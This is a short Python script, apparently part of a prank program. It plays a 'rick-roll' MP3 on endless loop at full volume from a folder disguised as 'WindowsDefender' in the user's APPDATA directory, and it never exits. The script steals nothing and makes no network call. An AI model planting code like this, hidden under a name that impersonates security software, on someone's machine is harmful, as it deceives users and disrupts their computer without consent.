from pygame import mixer
import pygame
import os
path = os.path.join(os.getenv('APPDATA'), "WindowsDefender")
filename = "rick-roll.mp3"
file_path = os.path.join(path, filename)
pygame.init()
pygame.mixer.init()
mixer.music.load(file_path)#music file 
mixer.music.play(-1)
pygame.mixer.music.set_volume(1)

while True:
    ...
